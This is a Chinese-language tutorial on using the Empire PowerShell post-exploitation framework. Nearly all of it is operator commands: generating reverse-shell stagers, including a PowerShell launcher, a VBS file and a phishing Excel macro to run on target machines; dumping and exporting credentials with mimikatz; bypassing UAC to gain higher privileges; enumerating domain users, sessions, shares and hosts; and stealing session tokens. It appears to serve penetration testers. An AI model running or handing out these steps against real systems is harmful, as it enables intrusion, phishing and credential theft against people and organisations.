## **一、前言**
Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中
## **二、empire使用详解**
### **1.Empire 的安装**
    wget https://raw.githubusercontent.com/backlion/demo/master/Empire-master.zip
    unzip Empire-master.zip
    cd  Empire-master
    cd setup/
    ./install.sh
    (最后输入数据库密码)
注意：新版本貌似有点小问题，我这里采用2015年旧版本可以正常使用.新版本命令有所改变。
重新恢复到初始状态：
    root@backlion:/opt/Empire-master# cd setup/
    root@backlion:/opt/Empire-master/setup# ls
    root@backlion:/opt/Empire-master/setup#
### **2.简单命令使用**
    cd  Empire-master
    ./empire
> (Empire) > help #主菜单帮助命令
> (Empire) > listeners #查看本地监听代理地址，现在还没有会话代理,所以为空
> (Empire: listeners) > info #列出详细信息
> (Empire: listeners) > set Name bk #设置Name为bk
>
> (Empire: listeners) > execute #执行命令，这条命令将其name设置生效
> (Empire: listeners) > usestager launcher bk #调用posershell模块并, name为bk
> (Empire: agents) > interact USSZC2P1XCTBKYGH
>
> (Empire: USSZC2P1XCTBKYGH) > upload /tmp/test.hta #文件上传
>
> (Empire: USSZC2P1XCTBKYGH) > shell dir
> (Empire: USSZC2P1XCTBKYGH) > download test.hta #文件下载
代理监听IP地址更改：
通过kali下的SQLiteBrowser打开empire下data目录下的数据库empire.db修改监听IP
### **3.生成反弹shell代理：**
#### **3.1 posershell反弹shell代理**
> (Empire: listeners) > usestager（空格+tab） #查看usestager监听模块
> (Empire: listeners) > usestager launcher test
> #调用powershell模块，test为name名称,这里的name需要提前设置,否则无法导入模块
> (Empire: stager/launcher) > execute #执行命令
将上面生成的posershell命令在win7及系统以上执行：
执行命令后Empire端会显示监听成功：
#### **3.2 vbs反弹shell代理**
> (Empire: listeners) > usestager launcher_vbs test
> (Empire: stager/launcher_vbs) > execute #执行命令
将launcher.vbs拷贝到目标主机上执行：
执行命令后Empire端显示监听成功：
> (Empire: stager/launcher_vbs) > execute
#### **3.3 钓鱼宏代理**
在empire端执行：
    (Empire: listeners) > usestager macro bk
    (Empire: stager/macro) > info
    (Empire: stager/macro) > execute
    root@backlion:~#cat  /tmp/macro
将生产的代码复制创建到execl的宏代码中：
这里是将保存为execl2003的文档并执行：
### **4.代理界面的命令使用**
> (Empire: stager/launcher_vbs) > agents
> #查看代理情况，带有（*）的是已被提升过的代理，可通过bypassuac进行提权
> (Empire: agents) > rename EEDLABPF43FAGWHZ DC #重新命名代理名
> (Empire: agents) > list #列出代理
> (Empire: agents) > list stale #列出已丢失反弹代理
> (Empire: agents) > remove stale #删除已丢失反弹代理
>
> (Empire: agents) > list
> (Empire: agents) > interact Y1DMVFG4CGKB24KP
> #进入到某个代理主机中，这里注意的是带有*的用户名对应的代理是具有管理员高权限代理。如果是没有需要提权。
> (Empire: Y1DMVFG4CGKB24KP) > help #代理界面的命令使用帮助
> (Empire: TKRTTL2V3BNRVDK4) > mimikatz #加载mimikatz获取hash
> (Empire: TKRTTL2V3BNRVDK4) > creds #查看所有hash值包括明文
> (Empire: DGPWHW4E2Z2NT3PL) > creds krbtgt #搜索特定用户的krbtgt
> (Empire: DGPWHW4E2Z2NT3PL) > creds plaintext #搜索hash中的明文
> (Empire: DGPWHW4E2Z2NT3PL) > creds hash #列出所有hash值（不包括明文）
> (Empire: DGPWHW4E2Z2NT3PL) > creds export /opt/hash.csv #导出hash凭证到指定的格式
root@backlion:/opt# cat hash.csv
> (Empire: TKRTTL2V3BNRVDK4) > shell ipconfig #查看IP地址
>
> (Empire: TKRTTL2V3BNRVDK4) > shell net localgroup administrators #查看管理员组
> (Empire: TKRTTL2V3BNRVDK4) > back #返回上一层
### **5.模块化使用案列：**
#### **5.1检查UAC提权方法模块**
> (Empire: agents) > interact P2V4CXEGRPHUD43T #进入到代理主机
>
> (Empire: P2V4CXEGRPHUD43T) > usemodule（空格+tab键）
> #查看usemodule的模块，注意需要在进入到代理主机才能使用该模块,UAC提权需要是管理员组的用户才行
> (Empire: P2V4CXEGRPHUD43T) > usemodule privesc/powerup/allchecks #检查提权方法模块
> (Empire: privesc/powerup/allchecks) > execute #执行检查
> (Empire: privesc/powerup/allchecks) > back #返回上一命令界面
#### **5.2 UAC提权模块**
> (Empire: P2V4CXEGRPHUD43T) > bypassuac test
> #执行uac提权，这里的test就是默认的name,可以自定义，貌似有问题，建议默认就可以了。
> (Empire: P2V4CXEGRPHUD43T) > agents
> #查看到提权后UAC的name对应主机（带有*的用户的name,表示代理已提权过）
> (Empire: agents) > interact P2V4CXEGRPHUD43T #进入提权后的的uac主机
>
> (Empire: P2V4CXEGRPHUD43T) > ps #查看进程
#### **5.3 本地管理组访问模块**
> (Empire: HPEUGGBSPSAPWGZW) >usemodule
> situational_awareness/network/find_localadmin_access #加载本地管理组访问模块
>
> (Empire: situational_awareness/network/find_localadmin_access) > info #查看信息
> (Empire: situational_awareness/network/find_localadmin_access) > execute
> #执行命令
> (Empire: situational_awareness/network/find_localadmin_access) > back
> #返回上一命令界面
#### **5.4用户账号枚举信息**
    (Empire: HPEUGGBSPSAPWGZW) > situational_awareness/network/get_use 
    (Empire: situational_awareness/network/get_user) > set UserName  bk
    (Empire: situational_awareness/network/get_user) > set Domain bk.com
    (Empire: situational_awareness/network/get_user) > execute #这里可以累出具体某个用户的信息
#### **5.5网络用户会话登录情况**
    (Empire: HPEUGGBSPSAPWGZW) >usemodule situational_awareness/network/userhunter
    (Empire: situational_awareness/network/userhunter) > info
    (Empire: situational_awareness/network/userhunter) > execute  #这里可以清楚得到那个用户登录给某台主机
#### **5.6 网络扫描**
    (Empire: HPEUGGBSPSAPWGZW) > shell ping  -a -n 1  192.168.99.104 #这里ping管理员登录过的会话IP地址所得到主机名
    (Empire: HPEUGGBSPSAPWGZW) > usemodule  situational_awareness/network/arpscan
    (Empire: situational_awareness/network/arpscan) > info
    (Empire: situational_awareness/network/arpscan) > set Range 10.0.0.100-10.0.0.254
    (Empire: situational_awareness/network/arpscan) > info
    (Empire: situational_awareness/network/arpscan) > execute
#### **5.6 DNS信息获取**
    (Empire: situational_awareness/network/arpscan) >usemodule situational_awareness/network/reverse_dns
    (Empire: situational_awareness/network/reverse_dns) > info
    (Empire: situational_awareness/network/reverse_dns) > execute
#### **5.7 共享文件**
    (Empire: situational_awareness/network/reverse_dns) >usemodule situational_awareness/network/sharefinder
    (Empire: situational_awareness/network/sharefinder) > info
    (Empire: situational_awareness/network/sharefinder) > set  CheckShareAccess  True
    (Empire: situational_awareness/network/sharefinder) > execute
#### **5.8 会话令牌偷取获取目标访问权限**
    (Empire: agents) > interact S4DU3VSRKR3U1DDF
    (Empire: S4DU3VSRKR3U1DDF) > ps cmd
    (Empire: S4DU3VSRKR3U1DDF) > steal_token  3716